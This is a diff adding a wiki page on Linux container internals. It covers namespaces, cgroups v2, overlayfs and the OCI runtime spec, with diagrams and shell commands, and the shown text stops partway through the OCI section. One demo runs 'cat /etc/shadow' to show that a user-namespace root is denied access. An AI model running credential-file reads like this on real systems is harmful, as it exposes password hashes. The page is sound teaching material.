@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Container Internals | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Container Internals">
+		<meta name="keywords" content="capabilities, cgroups, container-escape, containers, namespaces, nsenter, oci, podman, sysinternals, unshare">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Container Internals">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Namespace isolation deep dive - PID, mount, network, user, cgroup, and time namespaces; cgroups v2 controllers; OCI runtime spec; container escape vectors and mitigations.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/sysinternals/containers-internals.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Container Internals">
+		<meta name="twitter:description" itemprop="description" content="Namespace isolation deep dive - PID, mount, network, user, cgroup, and time namespaces; cgroups v2 controllers; OCI runtime spec; container escape vectors and mitigations.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#the-container-is-not-a-vm">The Container Is Not a VM</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#namespace-primitives">Namespace Primitives</a></b>
+					<ul>
+						<li><a href="#namespaces-in-proc">Namespaces in /proc</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#pid-namespaces">PID Namespaces</a></b>
+					<ul>
+						<li><a href="#creating-a-pid-namespace">Creating a PID namespace</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#mount-namespaces">Mount Namespaces</a></b>
+					<ul>
+						<li><a href="#mount-namespace-setup">Mount Namespace Setup</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#network-namespace-virtual-interfaces">Network Namespace - Virtual Interfaces</a></b>
+					<ul>
+						<li><a href="#network-namespace-and-veth">Network Namespace and veth</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#user-namespace-uidgid-mapping">User Namespace - UID/GID Mapping</a></b>
+					<ul>
+						<li><a href="#creating-and-inspecting-user-namespaces">Creating and inspecting user namespaces</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#cgroups-v2-resource-control">Cgroups v2 - Resource Control</a></b>
+					<ul>
+						<li><a href="#cgroups-v2-interface">Cgroups v2 interface</a></li>
+						<li><a href="#set-cgroup-v2-limits">Set cgroup v2 Limits</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#overlay-filesystem">Overlay Filesystem</a></b>
+					<ul>
+						<li><a href="#inspecting-overlay-mounts">Inspecting overlay mounts</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#oci-runtime-spec">OCI Runtime Spec</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#container-escape-techniques">Container Escape Techniques</a></b>
+					<ul>
+						<li><a href="#escape-demonstration">Escape Demonstration</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#container-security-best-practices">Container Security Best Practices</a></b>
+					<ul>
+						<li><a href="#secure-container-run-command">Secure container run command</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/sysinternals/index.html">Sysinternals</a></li>
+						<li aria-current="page"><a href="/wiki/articles/sysinternals/containers-internals.html">Containers Internals</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="container-internals">Container Internals</h2>
+					<p>
+						Namespace isolation deep dive - PID, mount, network, user, cgroup, and time namespaces; cgroups
+						v2 controllers; OCI runtime spec; container escape vectors and mitigations.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							A container is a process, not a virtual machine: the kernel isolates it with namespaces, cgroups,
+							and capabilities rather than a hypervisor. This article walks the isolation primitives one by
+							one, shows how to inspect them from
+							<code>/proc</code>
+							and
+							<code>/sys/fs/cgroup</code>
+							, and finishes with the escape
+							vectors that break each boundary. After reading it you can explain why
+							<code>uname -r</code>
+							is identical
+							inside and outside a container, and measure what a weak container configuration exposes.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/containers.html">Containers</a> - container fundamentals, images, basic security</li>
+							<li><a href="/wiki/articles/sysinternals/kernel-architecture.html">Kernel Architecture</a> - kernel space layout, privilege model</li>
+							<li><a href="/wiki/articles/sysinternals/process-manager.html">Process Manager</a> - task_struct, fork/exec internals</li>
+							<li><a href="/wiki/articles/fundamentals/unix-permissions.html">Unix Permissions</a> - UID/GID, capabilities, access control lists</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="the-container-is-not-a-vm">The Container Is Not a VM</h3>
+						<p>
+							A container is not a virtual machine. There is no hypervisor, no virtual hardware, no BIOS,
+							no separate kernel. A container is a process (or group of processes) that the kernel isolates
+							from the rest of the system using three Linux kernel features: namespaces, cgroups, and capabilities.
+							Understanding containers means understanding these primitives - because every container escape
+							is simply a loophole in one of these isolation mechanisms.
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                     CONTAINER vs VM ISOLATION                          │
+│                                                                      │
+│  VIRTUAL MACHINE:                                                     │
+│  ┌──────────────────────────────┐  ┌──────────────────────────────┐  │
+│  │  Guest OS (kernel + usersp)  │  │  Guest OS                    │  │
+│  │  - Own kernel (ring 0)       │  │                              │  │
+│  │  - Own page tables (EPT/NPT) │  │                              │  │
+│  │  - Own device drivers        │  │                              │  │
+│  │  - Hardware-enforced isolat. │  │                              │  │
+│  └──────────────+───────────────┘  └──────────────+───────────────┘  │
+│                 │                                  │                  │
+│  ┌──────────────▼──────────────────────────────────▼──────────────┐  │
+│  │                     HYPERVISOR (ring -1)                        │  │
+│  └─────────────────────────────────────────────────────────────────┘  │
+│                                                                      │
+│  CONTAINER:                                                          │
+│  ┌─────────────────┐  ┌─────────────────┐                           │
+│  │ Container A     │  │ Container B     │                           │
+│  │ (set of namesp) │  │ (set of namesp) │                           │
+│  └────────+────────┘  └────────+────────┘                           │
+│           │                    │                                     │
+│  ┌────────▼────────────────────▼─────────────────────────────────┐  │
+│  │               SINGLE KERNEL (ring 0)                            │  │
+│  │  - One kernel, shared across all containers                    │  │
+│  │  - Namespaces provide the illusion of isolation                 │  │
+│  │  - cgroups provide resource limits                              │  │
+│  │  - Kernel bug = ALL containers compromised                      │  │
+│  └────────────────────────────────────────────────────────────────┘  │
+│                                                                      │
+│  Key consequence: `uname -r` returns the same inside and outside.    │
+│  The kernel is shared. A kernel exploit in a container = root on host.│
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+					</section>
+					<section>
+						<h3 id="namespace-primitives">Namespace Primitives</h3>
+						<p>
+							Linux namespaces partition kernel resources so that one set of processes sees one set of resources
+							while another set of processes sees a different set. There are currently eight namespace types.
+						</p>
+						<p>Linux namespaces overview:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Namespace Type</th>
+									<th align="center">clone() flag</th>
+									<th align="center">What It Isolates</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Mount</td>
+									<td align="center">NEWNS</td>
+									<td align="center">Filesystem mount points</td>
+								</tr>
+								<tr>
+									<td align="center">UTS</td>
+									<td align="center">NEWUTS</td>
+									<td align="center">Hostname and NIS domain name</td>
+								</tr>
+								<tr>
+									<td align="center">IPC</td>
+									<td align="center">NEWIPC</td>
+									<td align="center">System V IPC, POSIX message queues</td>
+								</tr>
+								<tr>
+									<td align="center">PID</td>
+									<td align="center">NEWPID</td>
+									<td align="center">Process ID numbers</td>
+								</tr>
+								<tr>
+									<td align="center">Network</td>
+									<td align="center">NEWNET</td>
+									<td align="center">Network devices, stacks, ports</td>
+								</tr>
+								<tr>
+									<td align="center">User</td>
+									<td align="center">NEWUSER</td>
+									<td align="center">User and group IDs</td>
+								</tr>
+								<tr>
+									<td align="center">Cgroup</td>
+									<td align="center">NEWCGROUP</td>
+									<td align="center">Cgroup root directory</td>
+								</tr>
+								<tr>
+									<td align="center">Time</td>
+									<td align="center">NEWTIME</td>
+									<td align="center">Monotonic and boot-time clocks (5.6+)</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="namespaces-in-proc">Namespaces in /proc</h4>
+						<pre class="bash">
+# Every process has a namespace file for each namespace type
+ls -la /proc/self/ns/
+# cgroup  ipc  mnt  net  pid  pid_for_children  time  time_for_children
+# user  uts
+
+# Each file is a symlink to a namespace identifier:
+# mnt -&gt; mnt:[4026531841]
+# The number in brackets is the namespace inode number.
+# Two processes sharing the same inode are in the same namespace.
+readlink /proc/self/ns/pid
+# pid:[4026531836]
+
+# Compare namespaces between two processes:
+stat -c %i /proc/self/ns/pid /proc/1/ns/pid
+# Same inode -&gt; same PID namespace
+						</pre>
+					</section>
+					<section>
+						<h3 id="pid-namespaces">PID Namespaces</h3>
+						<p>
+							PID namespaces create nested PID numbering. A process has one PID in each ancestor PID namespace.
+							The "init" process (PID 1) of each PID namespace has special responsibilities: it adopts orphaned
+							children and must handle signals properly. If PID 1 dies in a namespace, the kernel sends SIGKILL
+							to all other processes in that namespace.
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                      PID NAMESPACE NESTING                             │
+│                                                                      │
+│  Initial PID namespace (host):                                        │
+│    PID 1:  /sbin/init (systemd)                                       │
+│    PID 42: podman                                                    │
+│    PID 43: └─ conmon (container monitor)                             │
+│    PID 44:    └─ bash (container entrypoint)  ← NS PID 1            │
+│    PID 45:       └─ nginx: master             ← NS PID 2            │
+│    PID 46:          └─ nginx: worker           ← NS PID 3            │
+│    PID 47:             └─ nginx: worker        ← NS PID 4            │
+│                                                                      │
+│  Inside the container&#39;s PID namespace:                                │
+│    PID 1:  bash (host PID 44)                                         │
+│    PID 2:  nginx: master (host PID 45)                                │
+│    PID 3:  nginx: worker (host PID 46)                                │
+│    PID 4:  nginx: worker (host PID 47)                                │
+│                                                                      │
+│  Inside nested container (pod inside pod):                            │
+│    PID 1:  bash (host PID 48, outer NS PID 8)                        │
+│    PID 2:  sleep (host PID 49, outer NS PID 9)                       │
+│                                                                      │
+│  Visibility rules:                                                    │
+│  - Process can only see (kill/signal) processes in its own PID NS    │
+│  - or in descendant PID namespaces it created                        │
+│  - /proc from host shows ALL processes (if mounted from host NS)     │
+│  - Inside container /proc, only container&#39;s PID NS processes appear  │
+│  - PID 1 in a PID namespace is special (signal handling, reaping)    │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+						<h4 id="creating-a-pid-namespace">Creating a PID namespace</h4>
+						<pre class="bash">
+# Create a new PID namespace and run a shell
+sudo unshare --pid --fork --mount-proc bash
+
+# Inside this namespace:
+echo $$           # Shows: 1
+ps aux            # Shows only processes in this NS
+ls /proc          # Only PID 1 and self
+
+# From host (another terminal):
+ls /proc          # Shows the bash as a regular PID
+
+# Checking the PID namespace hierarchy:
+sudo lsns -t pid
+#        NS TYPE   NPROCS   PID USER   COMMAND
+# 4026531836 pid       342     1 root   /sbin/init
+# 4026532000 pid         2 12345 root   bash
+# The NPROCS column shows child namespaces inherit from parent.
+						</pre>
+					</section>
+					<section>
+						<h3 id="mount-namespaces">Mount Namespaces</h3>
+						<p>
+							Mount namespaces give each container an independent set of mount points. Changes in one mount
+							namespace are invisible to others. This is the basis for container filesystem images:
+							<code>pivot_root()</code>
+							into the container's rootfs, then mount
+							<code>/proc</code>
+							,
+							<code>/sys</code>
+							, etc.
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                     MOUNT NAMESPACE ISOLATION                          │
+│                                                                      │
+│  Host mount namespace:                                                │
+│    /                   (ext4, /dev/sda2)                              │
+│    ├── /proc           (proc)                                         │
+│    ├── /sys            (sysfs)                                        │
+│    ├── /dev            (devtmpfs)                                     │
+│    ├── /home           (ext4, /dev/sda3)                              │
+│    └── /var/lib/containers/...  ← container rootfs storage             │
+│                                                                      │
+│  Container mount namespace (after pivot_root + mounts):               │
+│    /                   (overlay: lowerdir+upperdir from host)         │
+│    ├── /proc           (proc, remounted)                              │
+│    ├── /sys            (sysfs, remounted)                             │
+│    ├── /dev            (tmpfs + device nodes)                         │
+│    ├── /etc/hostname   (bind mount from host)                        │
+│    └── /var/run/secrets (tmpfs for secrets)                           │
+│                                                                      │
+│  Mount events visible on host (if shared subtrees):                   │
+│    cat /proc/self/mountinfo | grep container                         │
+│    # Shows overlay lowerdir/upperdir/workdir for each container       │
+│    # With mount propagation set to &#39;private&#39;, mounts are isolated.    │
+│    # With &#39;shared&#39;, mount events propagate (dangerous default).       │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+						<h4 id="mount-namespace-setup">Mount Namespace Setup</h4>
+						<pre class="bash">
+# Create a new mount namespace
+sudo unshare --mount bash
+
+# Inside the new namespace, mounts are independent
+mount -t tmpfs tmpfs /mnt
+echo &#34;data&#34; &gt; /mnt/test
+
+# In another terminal (host), /mnt is NOT mounted
+ls /mnt/test  # No such file (or still empty)
+
+# Inspect mount namespace details:
+sudo cat /proc/self/mountinfo | head -20
+# Each line includes mount ID, parent ID, root, mount point, options
+
+# Shared subtrees (mount propagation):
+cat /proc/self/mountinfo | grep shared
+# shared:X = mount events propagate to peers with same X
+# master:X = receives events from peer group X
+# private  = no propagation (what containers typically want)
+						</pre>
+					</section>
+					<section>
+						<h3 id="network-namespace-virtual-interfaces">Network Namespace - Virtual Interfaces</h3>
+						<p>
+							Each network namespace has its own network stack: interfaces, routing tables, iptables rules,
+							and socket listings. Containers typically get a veth pair - one end in the container, one end
+							in a bridge on the host.
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                     NETWORK NAMESPACE ISOLATION                        │
+│                                                                      │
+│  ┌──────────────────────────────────────────────────────────────┐   │
+│  │                     Host Network Namespace                     │   │
+│  │                                                               │   │
+│  │  ┌─────────┐  ┌──────────┐  ┌───────────────────────────┐   │   │
+│  │  │ eth0    │  │ docker0  │  │ Container A veth (host)   │   │   │
+│  │  │ 10.0.0.2│  │ bridge   │  │ vethA@if5                 │   │   │
+│  │  └─────────┘  │ 172.17.0│  │ 172.17.0.2               │   │   │
+│  │               │   .1     │  └─────────────+─────────────┘   │   │
+│  │               └────+─────┘                │                  │   │
+│  │                    │                      │ (veth pair)      │   │
+│  └────────────────────+──────────────────────+──────────────────┘   │
+│                       │                      │                       │
+│  ┌────────────────────+──────────────────────+──────────────────┐   │
+│  │         Container A Network Namespace     │                   │   │
+│  │                    │                      │                   │   │
+│  │               ┌────+─────┐           ┌────+─────┐            │   │
+│  │               │ docker0  │           │ eth0@if6 │            │   │
+│  │               │ bridge   │  ◄─────── │ (veth)   │            │   │
+│  │               │ (if       │           │ 172.17.  │            │   │
+│  │               │  present) │           │   0.2    │            │   │
+│  │               └──────────┘           └──────────┘            │   │
+│  │                                                               │   │
+│  │  $ ip link show        # Shows only container interfaces      │   │
+│  │  $ ss -tlnp            # Shows only container sockets         │   │
+│  │  $ ip route            # Container&#39;s routing table            │   │
+│  └──────────────────────────────────────────────────────────────┘   │
+│                                                                      │
+│  Communication between namespaces:                                    │
+│  - Via veth pairs (as shown above)                                    │
+│  - Via bridge on host (multiple containers on same bridge)            │
+│  - Via host network (--net=host removes network isolation entirely)   │
+│  - Via macvlan/ipvlan (container gets direct L2/L3 host access)      │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+						<h4 id="network-namespace-and-veth">Network Namespace and veth</h4>
+						<pre class="bash">
+# Create a new network namespace
+sudo ip netns add testns
+
+# Create a veth pair
+sudo ip link add veth0 type veth peer name veth1
+
+# Move veth1 into the namespace
+sudo ip link set veth1 netns testns
+
+# Configure host-side interface
+sudo ip addr add 10.0.0.1/24 dev veth0
+sudo ip link set veth0 up
+
+# Configure namespace-side interface
+sudo ip netns exec testns ip addr add 10.0.0.2/24 dev veth1
+sudo ip netns exec testns ip link set veth1 up
+sudo ip netns exec testns ip link set lo up
+
+# Test connectivity
+ping -c 1 10.0.0.2
+sudo ip netns exec testns ping -c 1 10.0.0.1
+
+# List all network namespaces
+sudo ip netns list
+
+# Run a command inside the namespace
+sudo ip netns exec testns bash
+# Inside this shell: ip addr shows only lo and veth1
+# ss -tlnp shows only this namespace&#39;s listening sockets
+						</pre>
+					</section>
+					<section>
+						<h3 id="user-namespace-uidgid-mapping">User Namespace - UID/GID Mapping</h3>
+						<p>
+							User namespaces are the most complex and security-critical namespace type. They allow a process
+							to have root privileges (UID 0) inside the namespace while being unprivileged (UID 1000) outside.
+							This is the feature that enables "rootless containers."
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                      USER NAMESPACE MAPPING                            │
+│                                                                      │
+│  Host UID space:                                                      │
+│    UID 0 (root)     — full system privileges                          │
+│    UID 1000 (alice) — unprivileged user                               │
+│    UID 65534 (nobody)                                                 │
+│                                                                      │
+│  Inside user namespace (with mapping 0:1000:1, 1:100000:65536):       │
+│    Inside UID 0     → maps to host UID 1000 (alice, unprivileged)     │
+│    Inside UID 1     → maps to host UID 100000 (subordinate UID)       │
+│    Inside UID 65536 → maps to host UID 165535                         │
+│                                                                      │
+│  Mapping configuration:                                                │
+│    /etc/subuid:  alice:100000:65536                                    │
+│    /etc/subgid:  alice:100000:65536                                    │
+│                                                                      │
+│  What &#34;root inside the container&#34; actually means:                      │
+│    - Inside: can chown, mknod, mount (certain types), setns            │
+│    - Outside: has ONLY alice&#39;s host privileges                         │
+│    - Key difference from true root:                                    │
+│      - Cannot read /etc/shadow (host inode permissions)                │
+│      - Cannot kill processes outside the user namespace                │
+│      - Cannot load kernel modules                                      │
+│      - vfs_create/mknod/etc check the HOST UID, not namespace UID     │
+│                                                                      │
+│  Diagram: capability checks use the INITIAL user namespace&#39;s UID:      │
+│                                                                      │
+│  ┌────────────┐    capability check    ┌─────────────────┐           │
+│  │ Container  │─── ns_capable() ──────►│ ns_capable()     │           │
+│  │ UID 0      │    (checks NS UID)     │ sees UID 0       │           │
+│  │            │                        │ → GRANTED        │           │
+│  └────────────┘                        └─────────────────┘           │
+│                                                                      │
+│  ┌────────────┐    capability check    ┌─────────────────┐           │
+│  │ Container  │─── capable() ─────────►│ capable()        │           │
+│  │ UID 0      │    (checks initial NS) │ sees UID 1000    │           │
+│  │            │                        │ → DENIED         │           │
+│  └────────────┘                        └─────────────────┘           │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+						<h4 id="creating-and-inspecting-user-namespaces">Creating and inspecting user namespaces</h4>
+						<pre class="bash">
+# Create a user namespace with UID mapping
+unshare --user --map-root-user bash
+
+# Inside this namespace:
+id
+# uid=0(root) gid=0(root) groups=0(root)
+
+# But try something that checks the initial user namespace:
+cat /etc/shadow
+# Permission denied — the VFS checks the host UID (1000), not NS UID (0)
+
+# Inspect the UID mapping:
+cat /proc/self/uid_map
+#          0       1000          1
+#  (inside_uid) (host_uid) (count)
+
+cat /proc/self/gid_map
+#          0       1000          1
+
+# Check subordinate UIDs configured for your user:
+cat /etc/subuid
+# alice:100000:65536
+
+cat /etc/subgid
+# alice:100000:65536
+
+# What can a user namespace root do that a regular user can&#39;t?
+# - Create new namespaces (mount, PID, network, etc.)
+# - Change ownership of files it owns (manipulate capabilities on files)
+# - Mount certain filesystem types (FUSE, overlay with userxattr)
+						</pre>
+					</section>
+					<section>
+						<h3 id="cgroups-v2-resource-control">Cgroups v2 - Resource Control</h3>
+						<p>
+							Control groups (cgroups) limit, account for, and isolate resource usage. Cgroups v2 (unified
+							hierarchy) is the modern interface; cgroups v1 is deprecated.
+						</p>
+						<p>Cgroups v2 controllers:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Controller</th>
+									<th align="center">What It Controls</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">cpu</td>
+									<td align="center">CPU bandwidth (quota + period), real-time scheduling</td>
+								</tr>
+								<tr>
+									<td align="center">cpuset</td>
+									<td align="center">CPU core + memory node pinning</td>
+								</tr>
+								<tr>
+									<td align="center">memory</td>
+									<td align="center">Memory usage limit, OOM behavior, swap limit</td>
+								</tr>
+								<tr>
+									<td align="center">io</td>
+									<td align="center">Block I/O bandwidth and IOPS limits</td>
+								</tr>
+								<tr>
+									<td align="center">pids</td>
+									<td align="center">Maximum number of processes in the cgroup</td>
+								</tr>
+								<tr>
+									<td align="center">hugetlb</td>
+									<td align="center">HugeTLB page usage limits</td>
+								</tr>
+								<tr>
+									<td align="center">rdma</td>
+									<td align="center">RDMA/IB resource limits</td>
+								</tr>
+								<tr>
+									<td align="center">misc</td>
+									<td align="center">Miscellaneous scalar resources</td>
+								</tr>
+								<tr>
+									<td align="center">perf_event</td>
+									<td align="center">Perf events monitoring (per-cgroup)</td>
+								</tr>
+								<tr>
+									<td align="center">freezer</td>
+									<td align="center">Freeze/suspend all processes in cgroup</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="cgroups-v2-interface">Cgroups v2 interface</h4>
+						<pre class="bash">
+# Check cgroup version in use
+mount | grep cgroup
+# cgroup2 on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime)
+
+# Check which controllers are enabled
+cat /sys/fs/cgroup/cgroup.controllers
+# cpuset cpu io memory hugetlb pids rdma misc
+
+# Check which controllers are enabled for this process&#39;s cgroup
+cat /sys/fs/cgroup/cgroup.subtree_control
+
+# See current cgroup
+cat /proc/self/cgroup
+# 0::/user.slice/user-1000.slice/session-3.scope
+
+# Container cgroup hierarchy
+ls /sys/fs/cgroup/machine.slice/libpod-*
+# Contains container-specific cgroup with resource limits
+
+# Podman sets limits via the cgroup interface:
+sudo cat /sys/fs/cgroup/machine.slice/libpod-&lt;ID&gt;.scope/memory.max
+# Shows memory limit in bytes (e.g., 1073741824 = 1 GB)
+
+sudo cat /sys/fs/cgroup/machine.slice/libpod-&lt;ID&gt;.scope/pids.max
+# Shows PID limit (e.g., 100)
+
+# Memory pressure notification (PSI — Pressure Stall Information):
+cat /sys/fs/cgroup/machine.slice/libpod-&lt;ID&gt;.scope/memory.pressure
+# some avg10=0.00 avg60=0.00 avg300=0.00 total=0
+# full avg10=0.00 avg60=0.00 avg300=0.00 total=0
+						</pre>
+						<h4 id="set-cgroup-v2-limits">Set cgroup v2 Limits</h4>
+						<pre class="bash">
+# Create a cgroup and set limits
+sudo mkdir /sys/fs/cgroup/test.slice
+
+# Enable controllers for children
+echo &#34;+cpu +memory +pids&#34; | sudo tee /sys/fs/cgroup/test.slice/cgroup.subtree_control
+
+# Create a child cgroup
+sudo mkdir /sys/fs/cgroup/test.slice/container
+
+# Set memory limit to 256 MB
+echo &#34;268435456&#34; | sudo tee /sys/fs/cgroup/test.slice/container/memory.max
+
+# Set CPU limit to 0.5 cores (quota=50000us per period=100000us)
+echo &#34;50000 100000&#34; | sudo tee /sys/fs/cgroup/test.slice/container/cpu.max
+
+# Set PID limit
+echo &#34;50&#34; | sudo tee /sys/fs/cgroup/test.slice/container/pids.max
+
+# Move current shell into the cgroup
+echo $$ | sudo tee /sys/fs/cgroup/test.slice/container/cgroup.procs
+
+# Verify limits are in effect
+cat /sys/fs/cgroup/test.slice/container/memory.current
+cat /sys/fs/cgroup/test.slice/container/pids.current
+						</pre>
+					</section>
+					<section>
+						<h3 id="overlay-filesystem">Overlay Filesystem</h3>
+						<p>
+							Container images are stored and served using overlay filesystems (overlayfs), which stack multiple
+							directories into a single merged view:
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                     OVERLAYFS ARCHITECTURE                             │
+│                                                                      │
+│  ┌──────────────────────────────────────────────────────────────┐   │
+│  │                      MERGED VIEW                               │   │
+│  │  /var/lib/containers/storage/overlay/&lt;ID&gt;/merged/              │   │
+│  │                                                               │   │
+│  │  This is what the container sees as &#34;/&#34;.                      │   │
+│  │  ┌─────────────────────────────────────────────────────┐      │   │
+│  │  │  File: /usr/bin/python  ← from lowerdir (read-only)  │      │   │
+│  │  │  File: /etc/hostname    ← from upperdir (modified)   │      │   │
+│  │  │  File: /etc/passwd      ← from upperdir (modified)   │      │   │
+│  │  │  File: /usr/bin/myapp   ← from upperdir (new file)   │      │   │
+│  │  │  File: /usr/bin/bash    ← from lowerdir (read-only)  │      │   │
+│  │  └─────────────────────────────────────────────────────┘      │   │
+│  └──────+──────────+──────────+───────────────────────────────┘   │
+│         │          │          │                                    │
+│  ┌──────▼────┐┌────▼─────┐┌──▼──────────────┐                     │
+│  │ UPPERDIR  ││ WORKDIR  ││ LOWERDIR(s)      │                     │
+│  │ (rw)      ││ (internal││ (ro, multiple)   │                     │
+│  │           ││  work)   ││                  │                     │
+│  │  - /etc/ ││          ││ Layer 3: app code │                     │
+│  │    host- ││  Used    ││ Layer 2: python   │                     │
+│  │    name  ││  for     ││ Layer 1: base OS  │                     │
+│  │  - /etc/ ││  copy-up ││ Layer 0: scratch  │                     │
+│  │    passwd││  and     ││                  │                     │
+│  │  - /usr/ ││  atomic  ││ Lower layers are │                     │
+│  │    bin/  ││  operat- ││ immutable — any  │                     │
+│  │    myapp ││  ions    ││ modification     │                     │
+│  └─────────┘└─────────┘│  triggers copy-up │                     │
+│                         │  to upperdir      │                     │
+│                         └─────────────────┘                      │
+│                                                                      │
+│  Copy-on-write mechanism:                                             │
+│  1. Container opens file for writing                                  │
+│  2. File exists in lowerdir (read-only layer)                         │
+│  3. overlayfs copies the file to upperdir (copy-up)                   │
+│  4. Container writes to the copy in upperdir                          │
+│  5. Subsequent reads return the upperdir version                      │
+│                                                                      │
+│  To delete a file from lowerdir:                                      │
+│  1. overlayfs creates a &#34;whiteout&#34; file in upperdir                    │
+│  2. Whiteout = character device 0:0 in the same directory             │
+│  3. overlayfs hides the lowerdir file in the merged view               │
+│                                                                      │
+│  Directory operations:                                                │
+│  - Opaque directories: a directory with xattr &#34;trusted.overlay.opaque=y&#34;│
+│    in upperdir hides all contents of the corresponding lowerdir dir   │
+│  - Merged directories: entries from all layers appear merged           │
+└──────────────────────────────────────────────────────────────────────┘
+						</pre>
+						<h4 id="inspecting-overlay-mounts">Inspecting overlay mounts</h4>
+						<pre class="bash">
+# Find overlay mounts for containers
+sudo cat /proc/self/mountinfo | grep overlay
+
+# Example output line:
+# 123 456 0:67 / /var/lib/containers/storage/overlay/abc123/merged \
+#   rw,relatime - overlay overlay \
+#   rw,lowerdir=/var/lib/containers/storage/overlay/l/AA:/var/lib/.../l/BB, \
+#   upperdir=/var/lib/containers/storage/overlay/abc123/diff, \
+#   workdir=/var/lib/containers/storage/overlay/abc123/work
+
+# Explore a container&#39;s filesystem from the host:
+sudo ls -la /var/lib/containers/storage/overlay/
+
+# The &#39;l&#39; directory contains shortened symlinks to layer directories
+ls -la /var/lib/containers/storage/overlay/l/
+
+# Podman inspect reveals the overlay structure:
+podman inspect &lt;container&gt; | jq &#39;.[0].GraphDriver&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="oci-runtime-spec">OCI Runtime Spec</h3>
+						<p>
+							The Open Container Initiative (OCI) defines standards for container images and runtimes. The
+							runtime spec describes
+							<code>config.json</code>
+							- the
+							<abbr title="JavaScript Object Notation">JSON</abbr>
+							document that
+							tells a runtime (runc, crun, youki, gvisor) how to set up a container.
+						</p>
+						<pre class="plaintext">
+┌──────────────────────────────────────────────────────────────────────┐
+│                     OCI RUNTIME SPEC                                   │
+│                                                                      │
+│  config.json structure:                                                │
+│                                                                      │
+│  {                                                                   │
+│    &#34;ociVersion&#34;: &#34;1.1.0&#34;,                                            │
+│    &#34;process&#34;: {                                                       │
+│      &#34;terminal&#34;: true,                                                │
+│      &#34;user&#34;: {&#34;uid&#34;: 0, &#34;gid&#34;: 0},                                   │
